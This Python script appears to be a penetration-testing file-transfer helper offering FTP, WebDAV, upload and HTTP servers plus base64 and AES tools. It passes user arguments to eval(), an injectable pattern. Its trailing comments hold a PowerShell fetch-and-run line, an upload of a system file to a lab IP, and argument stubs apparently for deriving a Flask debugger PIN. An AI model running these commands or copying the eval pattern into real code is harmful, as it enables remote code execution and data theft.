#!/bin/python3
from transfer import *
import argparse

help_message = """
                                     Hello, {{username}}!

                                       List of actions:
                         #1 help             |     Show this page
                         #2 ftp              |     Start FTP server
                         #3 base64           |     Encode file to base64 and get md5sum
                         #4 upload_srv       |     Start server for uploading files
                         #5 webdav           |     Start WebDav server
                         #6 encrypt          |     Encrypt file with AES algorithm
                         #7 decrypt          |     Decrypt file with AES algorithm
                         #8 simple_srv       |     Start SimpleHTTPServer    
"""

def main():
    parser = argparse.ArgumentParser(description="Fast Transfer Tools")
    cmd = ""
    
    parser.add_argument("-a",
                        dest="action",
                        type=str,
                        help="Select action or enter 'help' action",
                        default="help")
    
    parser.add_argument("-b",
                        dest="host",
                        type=str,
                        help="Address which will bound")

    parser.add_argument("-p",
                        dest="port",
                        type=int,
                        help="Port")

    parser.add_argument("-d",
                        dest="dir",
                        type=str,
                        help="Starting directory")

    parser.add_argument("-f",
                        dest="file",
                        type=str,
                        help="File to read")

    parser.add_argument("--password",
                        dest="password",
                        type=str,
                        help="Password for some services")

    parser.add_argument("--show-commands",
                        dest="show_c",
                        type=str,
                        help="Show some available commands")
    
    parser.add_argument("--debug",
                        dest="debug",
                        type=int,
                        help="Enable debug info",
                        default=0)
        
    args = parser.parse_args()
    
    if args.debug:
        print(args)
    
    if args.debug:
        print('[+] Action: ' + args.action)
        
    if args.port:
        if args.debug:
            print('[*] Port: ' + str(args.port))
        cmd = ",port="+str(args.port)
        
    if args.host:
        if args.debug:
            print('[*] Host: ' + args.host)
        cmd += f",host='{args.host}'"

    if args.dir:
        if args.debug:
            print('[*] Directory: ' + args.dir)
        cmd += f",dir='{args.dir}'"

    if args.password:
        if args.debug:
            print('[*] Password: ' + args.password)
        cmd += f",password='{args.password}'"

    if args.file:
        if args.debug:
            print('[*] File: ' + args.file)
        cmd += f",file='{args.file}'"
        
    if args.debug:
        print('[*] Debug is enabled')     
        
    if args.show_c:
        if args.debug:
            print('[*] Show commands is enabled')
        


    cmd = cmd[1:]
    
    if args.debug:
        print('Symbols: ✅ ❌ * ')
        print(f"CMD: {cmd}")
        print("END DEBUG INFO\n\n")

    # ACTIONS
    try:
        if args.action == "help":
            print(help_message)  
            
        elif args.action == "ftp":
            eval(f'ftp_srv({cmd})')
            
        elif args.action == "base64":
            a = eval(f'base64_file({cmd})')
            print(f"[+] Base64 payload: {a[0]}\n[+] MD5 hash: {a[1]}")
        
        elif args.action == "upload_srv":
            eval(f"upload_srv({cmd})")

        elif args.action == "webdav":
            eval(f"WebDav_srv({cmd})")

        elif args.action == "encrypt":
            eval(f"encrypt({cmd})")
            
        elif args.action == "decrypt":
            eval(f"decrypt({cmd})")
                  
        elif args.action == "simple_srv":
            eval(f"simple_srv({cmd})")                     
        else:
            print('[-] No such action :(')
            
               #TypeError 
    except (FileNotFoundError, OSError, ValueError, KeyboardInterrupt) as error:
        # FTP FileNotFound
        print('ERROR DEBUG')
        print(error.__class__)
        print(error)
        
        # Нет аргумента
        if "missing" in str(error) and "argument" in str(error):
            arg = str(error).split("'")[-2]
            print(f"[-] Missing argument [{arg}] :(")

        # Лишний аргумент
        elif "unexpected" in str(error) and "argument" in str(error):
            arg = str(error).split("'")[-2]
            print(f'[-] Unexpected argument [{arg}] :(')
             
        # Не могу найти файл
        elif "[Errno 2]" in str(error):
            print("[-] Can't find file :(")
    
        # Не могу назначить адрес
        elif "[Errno 99]" in str(error):
            print("[-] Cannot assign requested address :(") 
            
        # Не могу найти каталог
        elif "no such directory" in str(error):
            print("[-] No such directory :(")
        
        # Ошибка при создании сокета
        elif "No socket could be created" in str(error):
            print("[-] No socket could be created :(") 
        
        # Ошибка при чтении
        elif "Incorrect IV length" in str(error):
            print("[-] Incorrect IV length in file :(") 
        
        
        elif "KeyboardInterrupt" in str(error.__class__):
            print('[+] Stopping the service')
        else:
            print('[-] Some error ;(')
        
if __name__ == "__main__":
    main()
    print("\n[*] Thanks for using :3\n[+] With love from SidneyJob")







# IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
# PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts


# parser.add_argument("--modname", dest="modname", type=str, help="Modname (Default: flask.app)",default='flask.app') # flask.app
# parser.add_argument("--appname", dest="appname", type=str, help="Appname (Default: Flask)",default='Flask') # Flask
# parser.add_argument("--mac", dest="mac", required=True, type=str, help="MAC address any interface") # REQUIRED
# parser.add_argument("--machine_id", dest="mch_id",required=True, type=str, help="Enter /etc/machine-id or /proc/sys/kernel/random/boot_id") # REQUIRED
# parser.add_argument("--cgroup", dest="cgroup",required=True, type=str, help="Enter /proc/self/cgroup") # REQUIRED
   